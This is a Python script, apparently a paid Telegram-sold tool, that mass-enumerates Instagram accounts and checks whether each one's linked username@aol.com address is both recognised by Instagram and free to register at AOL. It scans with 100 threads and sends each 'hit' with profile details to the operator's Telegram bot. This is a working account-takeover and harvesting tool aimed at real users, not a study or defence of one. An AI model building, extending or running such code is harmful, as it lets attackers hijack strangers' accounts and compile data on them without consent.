import requests
from datetime import datetime
import time
import sys
import os
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

REMOTE_URL = "https://raw.githubusercontent.com/Anuj6112008/NewAol/main/userid.txt"

def fetch_id_data():
    try:
        response = requests.get(REMOTE_URL, timeout=5)
        response.raise_for_status()
        return [line.strip() for line in response.text.strip().splitlines() if "|" in line]
    except Exception as e:
        print(f"\n\033[1;91m[❌] Error fetching data from server: {e}\033[0m")
        return []

def check_id_validity(input_id):
   
    input_id = input_id.strip()
    if not input_id:
        return False
        
    data = fetch_id_data()

    for record in data:
        try:
            id_val, expiry_str = map(str.strip, record.split("|"))
            
            if id_val == input_id:
                expiry_dt = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                now = datetime.now()
                
                diff = expiry_dt - now
                
                if diff.total_seconds() > 0:
                    remaining_minutes = int(diff.total_seconds() // 60)
                    print(f"\033[1;92m\n[✅] Valid ID. Access expires in {remaining_minutes} minutes.\033[0m")
                    return True
                else:
                    print(f"\033[1;91m\n[⛔] Your ID ({input_id}) has expired.\033[0m")
                    print("\033[1;93mRenew your subscription via Telegram: @PyAnuj\033[0m")
                    return False
        except Exception:
            continue

    print(f"\033[1;91m\n[⚠️] ID '{input_id}' is not registered.\033[0m")
    print("\033[1;93mBuy a subscription from: @PyAnuj (TG)\033[0m")
    return False


input_user_id = input("\033[1m- [ ! ] USER ID : \033[0m").strip()

if not check_id_validity(input_user_id):
    time.sleep(2)
    sys.exit() 
print("\033[1;94m--- Starting Script, Please Wait... ---\033[0m\n")
time.sleep(1)
clear()
import os
import os
import requests
from user_agent import generate_user_agent
from time import time
from hashlib import md5
from random import choice
from concurrent.futures import ThreadPoolExecutor
from cfonts import render, say
from requests import post as pp
from user_agent import generate_user_agent as gg
import os

try:
    import httpx
    import user_agent
except:
    os.system("pip install httpx httpx[http2] user_agent")
    import httpx
    import user_agent
    

import requests
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import random
import string
import json
from random import choice as cc
from random import randrange as rr
import random
import base64
import re
import ethan
import sys
from asmix import Instagram
import random
import string
import json
import requests
from threading import Thread
from rich.console import Console
Con = Console()
import os
from random import randrange

try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from random import choice
except:
  os.system("pip install random")
  from random import choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
from concurrent.futures import ThreadPoolExecutor
ab=0
go=0
Ex = 0
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from random import choice
except:
  os.system("pip install random")
  from random import choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
hits=0
bads_instgram=0
bads_email=0
min_followers = 0  
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'

from asmix import Instagram    
Z = '\033[1;31m' 
F = '\033[1;33m'
Z1 = '\033[2;31m' 
S = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m' 
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m' 
B="\033[1;30m" 
R="\033[1;31m" 
G="\033[1;32m" 
Y="\033[1;33m" 
Bl="\033[1;34m" 
P="\033[1;35m"
C="\033[1;36m" 
N="\033[1;37m" 
import random
from time import sleep
b = random.randint(5,208)
ji = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
ksmk=f'\x1b[38;5;{ji}m'
import socket


Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
Y = '\033[1;34m' 
M = '\x1b[1;37m'
U = '\x1b[1;37m'
X = '\033[1;33m' 
Y = '\033[1;34m' 
M = '\x1b[1;37m'
S = '\033[1;33m'
R = '\033[1;31m' 
F = '\033[2;32m' 
E= "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C1 = '\033[2;35m'
H="\x1b[38;5;208m" 
ED='\x1b[38;5;208m'
ED='\x1b[38;5;208m'
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
ANUJ = render('{ANUJ}', colors=['red', 'white'], align='center')
print(f'''
{P}  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓      
                      {ANUJ}
    {S} dev -- @PyAnuj
{H}  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛               ''')


ID = input(f"{P} Enter Your Chat ID :  ")
print('')
token = input(f"{H}Enter Your Bot Token : ")
print('')
min_followers = int(input(f"{G}Enter Minimum Followers Required : "))
print('')




yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
os.system('clear')

def info(username, jj):
    global hits
    try:
      
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
        
        response = requests.get(url, headers=headers)
        data = response.json()
        user = data['data']['user']
        
        
        name = user.get("full_name", "N/A")
        user_id = user.get("id", "N/A")
        followers = user.get("edge_followed_by", {}).get("count", 0)
        following = user.get("edge_follow", {}).get("count", 0)
        posts = user.get("edge_owner_to_timeline_media", {}).get("count", 0)
        bio = user.get("biography", "N/A")
        is_private = user.get("is_private", False)
        is_verified = user.get("is_verified", False)
        
     
        if followers < min_followers:
          
            return False
        
        
        
        try:
            date = Instagram.date(user_id)
        except:
            date = "N/A"
        
       
        adh = f"""
    
    ┃ 𝗡𝗲𝘄 𝗛𝗶𝘁 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 ┃
    ════════════════════════════════
     Username   :  {username}
     Name      :  {name}
     Email    :  {username}@{jj}
     User ID   :  {user_id}
     Created   :  {date}
     Posts     :  {posts}
     Followers :  {followers} 
     Following :  {following}
     Private   :  {is_private}
    ════════════════════════════════
     Profile   :  https://instagram.com/{username}
    ════════════════════════════════
     By @PyAnuj 
            """
        
        
        hits += 1
        
     
        with open("anuhitsj.txt", "a", encoding="utf-8") as file:
            file.write(adh + "\n" + "="*50 + "\n")
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={adh}")
        
        return True
        
    except Exception as e:
        
        adh = f"""
    
    ┃ 𝗡𝗲𝘄 𝗛𝗶𝘁 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 ┃  
    ════════════════════════════════
     Username   :  {username}
     Email     :  {username}@{jj}
     Error     :  {str(e)[:50]}
    ════════════════════════════════
     Profile   :  https://instagram.com/{username}
    ════════════════════════════════
     By @PyAnuj
            """
        
        try:
           
            hits += 1
            with open("ethan.txt", "a", encoding="utf-8") as file:
                file.write(adh + "\n" + "="*50 + "\n")
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={adh}")
            return True
        except Exception as e:
            print(f"Error sending message: {e}")
            return False


def check_email_on_instagram(email):

    try:
        with httpx.Client(http2=True, timeout=30.0) as client:
            response = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data=f"email={email}",
                headers={
                    'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                    'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                    'accept': "*/*",
                    'accept-language': "en-US,en;q=0.9",
                    'origin': "https://www.instagram.com",
                    'referer': "https://www.instagram.com/",
                    'sec-fetch-dest': "empty",
                    'sec-fetch-mode': "cors",
                    'sec-fetch-site': "same-site",
                    'x-ig-app-id': "936619743392459",
                    'x-requested-with': "XMLHttpRequest"
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('error_type') == 'email_is_taken':
                    return True
                elif data.get('error_type') == 'email_is_not_taken':
                    return False
                else:
                
                    if 'available' in str(data).lower() and 'false' in str(data).lower():
                        return True
                    return False
            else:
                return False
                
    except Exception as e:
        print(f"Instagram check error: {e}")
        return False

def create_aol_account(username):

    try:
        first_names = ["Liam", "Olivia", "Noah", "Emma", "Ava", "Sophia", "James", "Isabella", "Gabriella", "Mia"]
        last_names = ["Johnson", "Brown", "Davis", "Miller", "Wilson", "Taylor", "Moore", "Collins", "Anderson", "Thomas"]
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        password = ''.join(random.choice(string.ascii_letters + string.digits + "!@#$%^&*()-_=+") for _ in range(12))
        
        agent = generate_user_agent()
        req = requests.get("https://login.aol.com/account/create", headers={'User-Agent': agent})
        
        soup = BeautifulSoup(req.text, "html.parser")
        crumb = soup.find("input", {"name": "crumb"}).get("value", "")
        acrumb = soup.find("input", {"name": "acrumb"}).get("value", "")
        sessionIndex = soup.find("input", {"name": "sessionIndex"}).get("value", "")
        asId = soup.find("input", {"name": "asId"}).get("value", "")
        cook = req.cookies.get_dict()
        
        payload = {
            'specId': "yidregsimplified",
            'context': "REGISTRATION",
            'crumb': crumb,
            'acrumb': acrumb,
            'sessionIndex': sessionIndex,
            'tos0': "oath_freereg|us|en-US",
            'asId': asId,
            'firstName': first_name,
            'lastName': last_name,
            'userid-domain': "yahoo",
            'userId': username,
            'password': password,
            'mm': str(random.randint(1, 12)),
            'dd': str(random.randint(1, 28)),
            'yyyy': random.randint(1990, 2002),
            'signup': ""
        }
        
        headers = {
            'User-Agent': agent,
            'sec-ch-ua-platform': "\"Android\"",
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua-mobile': "?1",
            'origin': "https://login.aol.com",
            'referer': "https://login.aol.com/account/create",
            'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        
        res = requests.post(
            "https://login.aol.com/account/module/create?validateField=userId",
            data=payload,
            headers=headers,
            cookies=cook
        ).text
        
        return '{"errors":[]}' in res
        
    except Exception as e:
        print(f"AOL creation error: {e}")
        return False

def check(email):
    global bads_instgram, bads_email, go
    
    try:
     
        b = random.randint(5,208)
        bo = f'\x1b[38;5;{b}m'
        bi = random.randint(5,208)
        bos = f'\x1b[38;5;{bi}m'
        
       
        email_exists = check_email_on_instagram(email)
        
        if email_exists:
            go += 1
            
            
            if '@' in email:
                username = email.split('@')[0]
                domain = email.split('@')[1]
            else:
                username = email
                domain = "aol.com"
            
           
            if create_aol_account(username):
              
                result = info(username, domain)
                
                if not result:
                    
                    pass
            else:
                bads_email += 1
        else:
            bads_instgram += 1
        
        
        os.system('clear' if os.name == 'posix' else 'cls')
        
        bi = random.randint(5,208)
        bos = f'\x1b[38;5;{bi}m'
        tt = (f'''
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    
    {G}Total Hits     : {hits} {M}
    {R}Bad Mail       : {bads_email} {Z} 
    {Y}Bad Instagram  : {bads_instgram} 
    {C}Good Accounts  : {go}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     ★ {B} Current Email  : {email}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━    
                              
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        ''')
        print(tt)
        
    except Exception as e:
        print(f"Error in check function: {e}")



executor = ThreadPoolExecutor(max_workers=30)

def Users():
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'x-csrftoken': 'GXmNMinj7hQfdQoCv1sVETC1JkUGyvDe',
        }
        data = {
            'variables': '{"id":"'+str(randrange(iud, uid))+'","location_id":"","shared_entity_id":"","shid":"","skip_location":true,"skip_sharer":true,"skip_user":false}',
            'doc_id': '23907016675582737',
        }
        response = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data)
        user = response.json()['data']['fetch__XDTUserDict']['username']
        email = user + '@aol.com'
        check(email)
    except Exception as e:
        pass

print('''
╔══════════════════════════════════════╗
║         SELECT YEAR RANGE            ║
╠══════════════════════════════════════╣
║  1  -  2011                         ║
║  2  -  2012                         ║
║  3  -  2013                         ║
║  4  -  2014                         ║
║  5  -  2015                         ║
║  6  -  2016-2017                    ║
╚══════════════════════════════════════╝
''')

num = int(input('Choice ==> : '))

if num == 1:
    uid = 18957417
    iud = 10000
elif num == 2:
    uid = 287924624
    iud = 18314009
elif num == 3:
    uid = 461365132
    iud = 1801651
elif num == 4:
    iud = 361365132
    uid = 1682665388
elif num == 5:
    iud = 1682665388
    uid = 3382665388
elif num == 6:
    iud = 2682665388
    uid = 8682665388
else:
    exit()

def ExUsers():
    for _ in range(1000):  
        Users()


threads = []
for _ in range(100): 
    thread = Thread(target=ExUsers)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
